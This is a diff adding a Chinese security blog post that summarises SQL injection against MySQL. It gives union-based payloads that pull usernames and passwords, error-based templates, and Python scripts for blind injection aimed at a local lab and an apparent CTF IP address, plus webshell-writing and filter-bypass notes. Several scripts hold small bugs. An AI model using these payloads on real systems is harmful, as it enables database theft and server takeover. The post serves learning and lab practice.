@@ -1,0 +1,700 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Hind:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css">
+  <script src="/lib/pace/pace.min.js"></script>
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":true,"scrollpercent":false},"bookmark":{"enable":true,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":true,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="….">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SQL注入总结">
+<meta property="og:url" content="http://example.com/2019/07/25/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/index.html">
+<meta property="og:site_name" content="fxxy">
+<meta property="og:description" content="….">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/image-20200625114647126.png">
+<meta property="og:image" content="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/image-20200625114449883.png">
+<meta property="og:image" content="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/image-20200625114250808.png">
+<meta property="og:image" content="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/image-20200625125524668.png">
+<meta property="og:image" content="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/image-20200625113936372.png">
+<meta property="og:image" content="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/image-20200625114006406.png">
+<meta property="article:published_time" content="2019-07-24T16:00:00.000Z">
+<meta property="article:modified_time" content="2021-10-22T08:33:06.570Z">
+<meta property="article:author" content="fxxy">
+<meta property="article:tag" content="web安全">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/image-20200625114647126.png">
+
+<link rel="canonical" href="http://example.com/2019/07/25/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>SQL注入总结 | fxxy</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="fxxy" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">fxxy</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">7</span></a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">19</span></a>
+
+  </li>
+        <li class="menu-item menu-item-友链">
+
+    <a href="/link/" rel="section"><i class="fa fa-link fa-fw"></i>友链</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="reading-progress-bar"></div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2019/07/25/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/logo.png">
+      <meta itemprop="name" content="fxxy">
+      <meta itemprop="description" content="力争下游。">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="fxxy">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          SQL注入总结
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2019-07-25 00:00:00" itemprop="dateCreated datePublished" datetime="2019-07-25T00:00:00+08:00">2019-07-25</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-10-22 16:33:06" itemprop="dateModified" datetime="2021-10-22T16:33:06+08:00">2021-10-22</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>….</p>
+<span id="more"></span>
+
+<h3 id="回显注入"><a href="#回显注入" class="headerlink" title="回显注入"></a>回显注入</h3><ul>
+<li>原理：web页面对后端返回的信息没做过滤，直接将数据库相关报错信息显示在页面上</li>
+<li>一般性步骤<ol>
+<li>利用点是否存在SQL 注入（恶意输入与正常输入页面做对比）</li>
+<li>获取数据库类型、版本</li>
+<li>判断数据表字段数<ul>
+<li> order by</li>
+</ul>
+</li>
+<li>判断回显位置<ul>
+<li> union select</li>
+</ul>
+</li>
+</ol>
+</li>
+</ul>
+<h4 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h4><p>以mysql为例：</p>
+<ul>
+<li>判断是否存在sql注入</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://test.com?id=1&#x27; // 报错语句</span><br><span class="line">http://test.com?id=1&#x27; or 1=1 -- -  //成功执行</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>判断字段数</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://test.com?id=1&#x27;  order by 3-- -</span><br><span class="line">http://test.com?id=1&#x27;  order by 4-- - //报错</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>判断回显位置</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://test.com?id=-1&#x27; union select 1,2,3-- -</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>获取数据库版本</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://test.com?id=-1&#x27;  union select 1,version(),3-- -</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>获取数据库名</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://test.com?id=-1&#x27;  union select 1,database(),3-- -</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>获取数据表</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://test.com?id=-1&#x27;  union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;),3-- -</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>获取数据表的字段名</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://test.com?id=-1&#x27; union select 1,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;),3 -- -</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>获取用户名和密码</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://test.com?id=-1&#x27; union select 1,(select group_concat(username) from users),(select group_concat(password) from users) -- -</span><br></pre></td></tr></table></figure>
+
+<h3 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h3><h4 id="主要函数"><a href="#主要函数" class="headerlink" title="主要函数"></a>主要函数</h4><ul>
+<li>left(str,len)：获取参数str从最左边开始的前len个字符</li>
+</ul>
+<p><img src="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/image-20200625114647126.png" alt="image-20200625114647126"></p>
+<ul>
+<li>ascii()：获取参数的ascii码</li>
+<li>ord()：获取参数的ascii码</li>
+</ul>
+<p><img src="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/image-20200625114449883.png" alt="image-20200625114449883"></p>
+<ul>
+<li><p>if(expr1,expr2,expr3)：</p>
+<ul>
+<li>expr1：判断条件</li>
+<li>expr2：条件成立时返回的结果</li>
+<li>expr3：条件不成立时返回的结果</li>
+</ul>
+<p><img src="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/image-20200625114250808.png" alt="image-20200625114250808"></p>
+</li>
+<li><p>substr(str,pos,len)：从第pos个字符开始，截取len个字符</p>
+</li>
+</ul>
+<p><img src="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/image-20200625125524668.png" alt="image-20200625125524668"></p>
+<h4 id="脚本实例"><a href="#脚本实例" class="headerlink" title="脚本实例"></a>脚本实例</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">zidian = <span class="string">&#x27;sqwertyuioplkjhgfdsazxcvbnm789456123.0.,/][\;&#123;$%&amp;*()&#125;&#x27;</span></span><br><span class="line">url = <span class="string">&quot;http://127.0.0.1/sqli/Less-6/?id=1&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_dbname</span>():</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">10</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> zidian:</span><br><span class="line">            </span><br><span class="line">            <span class="built_in">print</span>(j)</span><br><span class="line"></span><br><span class="line">            <span class="comment">#获取数据库名</span></span><br><span class="line">            payload = <span class="string">&#x27;http://127.0.0.1/sqli/Less-6/?id=1&quot; and if(ascii(substr((select database()),&#123;0&#125;,1))=&#123;1&#125;,1,0) -- -&#x27;</span>.<span class="built_in">format</span>(i,<span class="built_in">ord</span>(j))</span><br><span class="line"></span><br><span class="line">            <span class="comment">#获取数据表名 控制limit获取其他表</span></span><br><span class="line">            <span class="comment">#payload = &#x27;http://127.0.0.1/sqli/Less-6/?id=1&quot; and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),&#123;0&#125;,1))=&#123;1&#125;,1,0) -- -&#x27;.format(i,ord(j))</span></span><br><span class="line">            </span><br><span class="line">            <span class="comment">#获取字段名</span></span><br><span class="line">            <span class="comment">#payload = &#x27;http://127.0.0.1/sqli/Less-6/?id=1&quot; and if(ascii(substr((select column_name from information_schema.columns where table_name=&#x27;表名&#x27; limit 0,1),&#123;0&#125;,1))=&#123;1&#125;,1,0) -- -&#x27;.format(i,ord(j))</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">#获取字段值</span></span><br><span class="line">            <span class="comment">#payload = &#x27;http://127.0.0.1/sqli/Less-6/?id=1&quot; and if(ascii(substr((select column_name from 表名 limit 0,1),&#123;0&#125;,1))=&#123;1&#125;,1,0) -- -&#x27;.format(i,ord(j))</span></span><br><span class="line">            </span><br><span class="line">            <span class="built_in">print</span>(payload)</span><br><span class="line">            flag = requests.get(payload)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;You are in&quot;</span> <span class="keyword">in</span> flag.text:</span><br><span class="line">                res += j</span><br><span class="line">                <span class="built_in">print</span>(res)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">get_res()</span><br></pre></td></tr></table></figure>
+
+<h3 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h3><h4 id="相关函数"><a href="#相关函数" class="headerlink" title="相关函数"></a>相关函数</h4><ul>
+<li>sleep(x)：数据库沉睡x秒返回结果</li>
+</ul>
+<p><img src="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/image-20200625113936372.png" alt="image-20200625113936372"></p>
+<ul>
+<li><p>benchark(expr1,expr2)：将expr2这个表达式执行expr1次</p>
+<ul>
+<li>benchmark(1000,md5(1))：将1进行MD5加密1000次</li>
+</ul>
+<p><img src="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/image-20200625114006406.png" alt="image-20200625114006406"></p>
+</li>
+</ul>
+<h4 id="脚本示例"><a href="#脚本示例" class="headerlink" title="脚本示例"></a>脚本示例</h4><ul>
+<li>sleep</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">dbname = <span class="string">&#x27;&#x27;</span></span><br><span class="line">zidian=<span class="string">&quot;qwertyuiopasdfghjklzxcvbnm-_&#123;&#125;&quot;</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">7</span>):</span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> zidian:</span><br><span class="line">    <span class="comment"># 修改此处获取数据表、字段等值</span></span><br><span class="line">    url=<span class="string">&quot;http://222.18.158.254:4609/?id=1 and if(asci(substr(database(),&#123;0&#125;,1))=&#x27;&#123;1&#125;&#x27;,sleep(5),1)&quot;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(j),<span class="built_in">ord</span>(i))</span><br><span class="line">    <span class="comment"># t1 = time.time()</span></span><br><span class="line">    a=requests.get(url)</span><br><span class="line">    <span class="comment"># t2 = time.time()</span></span><br><span class="line">    <span class="comment"># total_time = t2 - t1</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(a.elapsed.total_seconds()&gt;=<span class="number">5</span>):</span><br><span class="line">      <span class="built_in">print</span> url</span><br><span class="line">      <span class="built_in">print</span> <span class="string">&quot;succeess&quot;</span></span><br><span class="line">      </span><br><span class="line">      dbname = dbname+i</span><br><span class="line">      <span class="built_in">print</span> dbname</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> dbname</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>benchmark</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">dbname = <span class="string">&#x27;&#x27;</span></span><br><span class="line">zidian=<span class="string">&quot;qwertyuiopasdfghjklzxcvbnm-_&#123;&#125;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">7</span>):</span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> zidian:</span><br><span class="line">    url=<span class="string">&quot;http://222.18.158.254:4610/?id=1 and if(ascii(substr(database(),&#123;0&#125;,1))=&#x27;&#123;1&#125;&#x27;,benchmark(1e5,md5(1)),1)&quot;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(j),i)</span><br><span class="line">    a=requests.get(url)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(a.elapsed.total_seconds()&gt;=<span class="number">1.5</span>):</span><br><span class="line">      <span class="built_in">print</span> url</span><br><span class="line">      <span class="built_in">print</span> <span class="string">&quot;succeess&quot;</span></span><br><span class="line">      dbname = dbname+i</span><br><span class="line">      <span class="built_in">print</span> dbname</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> dbname</span><br></pre></td></tr></table></figure>
+
+<h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><ul>
+<li>原理：利用数据库的报错机制，人为的制造错误信息并将信息显示到系统提示的错误中</li>
+</ul>
+<h4 id="floor"><a href="#floor" class="headerlink" title="floor"></a>floor</h4><ul>
+<li>模板</li>
+</ul>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="number">1</span>,<span class="built_in">count</span>(<span class="operator">*</span>),concat(查询语句,<span class="built_in">floor</span>(rand()<span class="operator">*</span><span class="number">2</span>))a <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> a</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>获取数据库</li>
+</ul>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="number">1</span>,<span class="built_in">count</span>(<span class="operator">*</span>),concat(database(),<span class="built_in">floor</span>(rand()<span class="operator">*</span><span class="number">2</span>))a <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> a</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>获取数据表<ul>
+<li>控制imit可获取其他表名</li>
+</ul>
+</li>
+</ul>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="number">1</span>,<span class="built_in">count</span>(<span class="operator">*</span>),concat( (<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">0</span>,<span class="number">1</span>),<span class="built_in">floor</span>(rand()<span class="operator">*</span><span class="number">2</span>))a <span class="keyword">from</span> information_schema.columns <span class="keyword">group</span> <span class="keyword">by</span> a</span><br></pre></td></tr></table></figure>
+
+<h4 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue()"></a>extractvalue()</h4><p>模板</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">extractvalue(1, concat(0x25, (查询语句)))</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>获取数据库名</li>
+</ul>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> news <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> extractvalue(<span class="number">1</span>, concat(<span class="number">0x25</span>, (<span class="keyword">select</span> database() <span class="keyword">from</span> information_schema.tables limit <span class="number">0</span>,<span class="number">1</span>)))</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>获取数据库表</li>
+</ul>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> news <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> extractvalue(<span class="number">1</span>, concat(<span class="number">0x25</span>, (<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">0</span>,<span class="number">1</span>)))</span><br><span class="line">控制limit得到其他表</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>获取数据库表的字段名</li>
+</ul>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> news <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> extractvalue(<span class="number">1</span>, concat(<span class="number">0x25</span>, (<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;表名&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span>)))</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>获取字段值</li>
+</ul>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> news <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> extractvalue(<span class="number">1</span>, concat(<span class="number">0x25</span>, (<span class="keyword">select</span> 字段名 <span class="keyword">from</span> 数据库名.表名  limit <span class="number">0</span>,<span class="number">1</span>)))</span><br></pre></td></tr></table></figure>
+
+<h4 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml()"></a>updatexml()</h4><p>模板</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">updatexml(<span class="number">0x7e</span>,concat(<span class="number">0x7e</span>,(查询语句),<span class="number">0x7e</span>),<span class="number">0x7e</span>)</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>获得数据库</li>
+</ul>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">updatexml(<span class="number">0x7e</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> database() <span class="keyword">from</span> information_schema.tables limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">0x7e</span>),<span class="number">0x7e</span>)</span><br></pre></td></tr></table></figure>
+
+<p>获取数据库表</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">updatexml(<span class="number">0x7e</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">0x7e</span>),<span class="number">0x7e</span>)</span><br></pre></td></tr></table></figure>
+
+<p>获取表的字段名</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">updatexml(<span class="number">0x7e</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;表名&#x27;</span> ),<span class="number">0x7e</span>),<span class="number">0x7e</span>)</span><br></pre></td></tr></table></figure>
+
+<p>获取字段值</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">updatexml(<span class="number">0x7e</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> group_concat(id) <span class="keyword">from</span> flag ),<span class="number">0x7e</span>),<span class="number">0x7e</span>)</span><br></pre></td></tr></table></figure>
+
+<p>此外还有二次注入，堆叠注入等</p>
+<h2 id="写shell"><a href="#写shell" class="headerlink" title="写shell"></a>写shell</h2><ul>
+<li>select into outfile<ul>
+<li>前提：需知道物理路径 ,secure_file_priv = on<ul>
+<li>@@basedir</li>
+<li>phpinfo()</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>phpmyadmin：日志漏洞<ul>
+<li>general log</li>
+<li>general log file</li>
+</ul>
+</li>
+</ul>
+<h3 id="绕过姿势"><a href="#绕过姿势" class="headerlink" title="绕过姿势"></a>绕过姿势</h3><ul>
+<li>双写绕过</li>
+<li>大小写绕过</li>
+<li>内联注释</li>
+<li>|| &amp;&amp; 绕过and or</li>
+<li>编码绕过<ul>
+<li>hex编码</li>
+<li>ascii编码</li>
+</ul>
+</li>
+</ul>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          
+          <div class="post-tags">
+              <a href="/tags/web%E5%AE%89%E5%85%A8/" rel="tag"><i class="fa fa-tag"></i> web安全</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2019/07/08/kali%E4%B8%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" rel="prev" title="kali下的信息收集工具学习">
+      <i class="fa fa-chevron-left"></i> kali下的信息收集工具学习
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2019/08/16/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" rel="next" title="文件包含学习">
+      文件包含学习 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
